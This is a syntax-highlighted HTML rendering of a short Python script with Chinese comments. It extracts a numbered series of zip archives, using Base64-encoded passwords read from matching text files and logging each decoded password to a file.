+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">import</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> base64</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-dark:#C792EA">def</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> decrypt_zip</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">(</span><span style="--shiki-light:#E64553;--shiki-light-font-style:italic;--shiki-dark:#7FDBCA;--shiki-dark-font-style:inherit">zip_path</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#E64553;--shiki-light-font-style:italic;--shiki-dark:#7FDBCA;--shiki-dark-font-style:inherit"> output_folder</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#E64553;--shiki-light-font-style:italic;--shiki-dark:#7FDBCA;--shiki-dark-font-style:inherit"> pass_path</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#E64553;--shiki-light-font-style:italic;--shiki-dark:#7FDBCA;--shiki-dark-font-style:inherit"> password_log_file</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">)</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">:</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">    try</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">:</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#637777;--shiki-dark-font-style:italic">        # 从密码文件读取密码</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">        password </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#1E66F5;--shiki-dark:#B2CCD6"> get_password_from_txt</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">pass_path</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">        if</span><span style="--shiki-light:#8839EF;--shiki-dark:#C792EA"> not</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> password</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">:</span></span>
+<span class="line"><span style="--shiki-light:#FE640B;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit">            print</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#40A02B;--shiki-light-font-style:italic;--shiki-dark:#C792EA;--shiki-dark-font-style:inherit">f</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">"无法获取密码：</span><span style="--shiki-light:#EA76CB;--shiki-dark:#82AAFF">{</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">pass_path</span><span style="--shiki-light:#EA76CB;--shiki-dark:#82AAFF">}</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">            return</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#637777;--shiki-dark-font-style:italic">        # 读取现有日志文件内容</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">        if</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> os</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">path</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#1E66F5;--shiki-dark:#B2CCD6">exists</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">password_log_file</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">):</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">            with</span><span style="--shiki-light:#FE640B;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit"> open</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">password_log_file</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">,</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">r</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> as</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> log_file</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">:</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">                existing_content </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> log_file</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#1E66F5;--shiki-dark:#B2CCD6">read</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">()</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">        else</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">:</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">            existing_content </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> ""</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#637777;--shiki-dark-font-style:italic">        # 记录密码到日志文件的开头</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">        with</span><span style="--shiki-light:#FE640B;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit"> open</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">password_log_file</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">,</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">w</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> as</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> log_file</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">:</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">            log_file</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#1E66F5;--shiki-dark:#B2CCD6">write</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#40A02B;--shiki-light-font-style:italic;--shiki-dark:#C792EA;--shiki-dark-font-style:inherit">f</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">"</span><span style="--shiki-light:#EA76CB;--shiki-dark:#82AAFF">{</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">password</span><span style="--shiki-light:#EA76CB;--shiki-dark:#82AAFF">}</span><span style="--shiki-light:#EA76CB;--shiki-dark:#F78C6C">\n</span><span style="--shiki-light:#EA76CB;--shiki-dark:#82AAFF">{</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">existing_content</span><span style="--shiki-light:#EA76CB;--shiki-dark:#82AAFF">}</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#637777;--shiki-dark-font-style:italic">        # 解压ZIP文件</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">        with</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> zipfile</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#1E66F5;--shiki-dark:#B2CCD6">ZipFile</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">zip_path</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">,</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">r</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> as</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> zip_ref</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">:</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">            zip_ref</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#1E66F5;--shiki-dark:#B2CCD6">setpassword</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">password</span><span style="--shiki-light:#7C7F93;--shiki-dark:#82AAFF">.</span><span style="--shiki-light:#1E66F5;--shiki-dark:#B2CCD6">encode</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">())</span><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#637777;--shiki-dark-font-style:italic">  # 设置密码</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">            zip_ref</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#1E66F5;--shiki-dark:#B2CCD6">extractall</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">output_folder</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#FE640B;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit">            print</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#40A02B;--shiki-light-font-style:italic;--shiki-dark:#C792EA;--shiki-dark-font-style:inherit">f</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">"解压成功：</span><span style="--shiki-light:#EA76CB;--shiki-dark:#82AAFF">{</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">zip_path</span><span style="--shiki-light:#EA76CB;--shiki-dark:#82AAFF">}</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">    except</span><span style="--shiki-light:#FE640B;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit"> RuntimeError</span><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> as</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> e</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">:</span></span>
+<span class="line"><span style="--shiki-light:#FE640B;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit">        print</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#40A02B;--shiki-light-font-style:italic;--shiki-dark:#C792EA;--shiki-dark-font-style:inherit">f</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">"密码错误或文件损坏：</span><span style="--shiki-light:#EA76CB;--shiki-dark:#82AAFF">{</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">zip_path</span><span style="--shiki-light:#EA76CB;--shiki-dark:#82AAFF">}</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> - </span><span style="--shiki-light:#EA76CB;--shiki-dark:#82AAFF">{</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">e</span><span style="--shiki-light:#EA76CB;--shiki-dark:#82AAFF">}</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">    except</span><span style="--shiki-light:#FE640B;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit"> Exception</span><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> as</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> e</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">:</span></span>
+<span class="line"><span style="--shiki-light:#FE640B;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit">        print</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#40A02B;--shiki-light-font-style:italic;--shiki-dark:#C792EA;--shiki-dark-font-style:inherit">f</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">"解压过程中出错：</span><span style="--shiki-light:#EA76CB;--shiki-dark:#82AAFF">{</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">zip_path</span><span style="--shiki-light:#EA76CB;--shiki-dark:#82AAFF">}</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> - </span><span style="--shiki-light:#EA76CB;--shiki-dark:#82AAFF">{</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">e</span><span style="--shiki-light:#EA76CB;--shiki-dark:#82AAFF">}</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-dark:#C792EA">def</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> decrypt_multiple_zips</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">(</span><span style="--shiki-light:#E64553;--shiki-light-font-style:italic;--shiki-dark:#7FDBCA;--shiki-dark-font-style:inherit">start_num</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#E64553;--shiki-light-font-style:italic;--shiki-dark:#7FDBCA;--shiki-dark-font-style:inherit"> end_num</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#E64553;--shiki-light-font-style:italic;--shiki-dark:#7FDBCA;--shiki-dark-font-style:inherit"> output_folder</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#E64553;--shiki-light-font-style:italic;--shiki-dark:#7FDBCA;--shiki-dark-font-style:inherit"> password_log_file</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">)</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">:</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#637777;--shiki-dark-font-style:italic">    # 确保输出文件夹存在</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">    if</span><span style="--shiki-light:#8839EF;--shiki-dark:#C792EA"> not</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> os</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">path</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#1E66F5;--shiki-dark:#B2CCD6">exists</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">output_folder</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">):</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">        os</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#1E66F5;--shiki-dark:#B2CCD6">makedirs</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">output_folder</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">    for</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> i </span><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">in</span><span style="--shiki-light:#FE640B;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit"> range</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">start_num</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">,</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF"> end_num </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">-</span><span style="--shiki-light:#FE640B;--shiki-dark:#F78C6C"> 1</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">,</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> -</span><span style="--shiki-light:#FE640B;--shiki-dark:#F78C6C">1</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">):</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">        zip_filename </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#40A02B;--shiki-light-font-style:italic;--shiki-dark:#C792EA;--shiki-dark-font-style:inherit"> f</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">"zip_</span><span style="--shiki-light:#EA76CB;--shiki-dark:#82AAFF">{</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">i</span><span style="--shiki-light:#EA76CB;--shiki-dark:#82AAFF">}</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">.zip"</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">        pass_filename </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#40A02B;--shiki-light-font-style:italic;--shiki-dark:#C792EA;--shiki-dark-font-style:inherit"> f</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">"password_</span><span style="--shiki-light:#EA76CB;--shiki-dark:#82AAFF">{</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">i</span><span style="--shiki-light:#EA76CB;--shiki-dark:#82AAFF">}</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">.txt"</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">        zip_path </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> os</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">path</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#1E66F5;--shiki-dark:#B2CCD6">join</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">output_folder</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">,</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF"> zip_filename</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">        pass_path </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> os</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">path</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#1E66F5;--shiki-dark:#B2CCD6">join</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">output_folder</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">,</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF"> pass_filename</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#637777;--shiki-dark-font-style:italic">        # 如果文件存在，解压</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">        if</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> os</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">path</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#1E66F5;--shiki-dark:#B2CCD6">exists</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">zip_path</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">):</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#B2CCD6">            decrypt_zip</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">zip_path</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">,</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF"> output_folder</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">,</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF"> pass_path</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">,</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF"> password_log_file</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">        else</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">:</span></span>
+<span class="line"><span style="--shiki-light:#FE640B;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit">            print</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#40A02B;--shiki-light-font-style:italic;--shiki-dark:#C792EA;--shiki-dark-font-style:inherit">f</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">"文件不存在：</span><span style="--shiki-light:#EA76CB;--shiki-dark:#82AAFF">{</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">zip_path</span><span style="--shiki-light:#EA76CB;--shiki-dark:#82AAFF">}</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-dark:#C792EA">def</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> get_password_from_txt</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">(</span><span style="--shiki-light:#E64553;--shiki-light-font-style:italic;--shiki-dark:#7FDBCA;--shiki-dark-font-style:inherit">file_path</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">)</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">:</span></span>
+<span class="line"><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">    """</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">从密码文件读取Base64编码的密码并解码</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"""</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">    try</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">:</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">        with</span><span style="--shiki-light:#FE640B;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit"> open</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">file_path</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">,</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">r</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> as</span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478"> file</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">:</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">            encoded_password </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478"> file</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#1E66F5;--shiki-dark:#B2CCD6">read</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">().</span><span style="--shiki-light:#1E66F5;--shiki-dark:#B2CCD6">strip</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">()</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">            decoded_password </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> base64</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#1E66F5;--shiki-dark:#B2CCD6">b64decode</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">encoded_password</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">).</span><span style="--shiki-light:#1E66F5;--shiki-dark:#B2CCD6">decode</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">utf-8</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">            return</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> decoded_password</span></span>
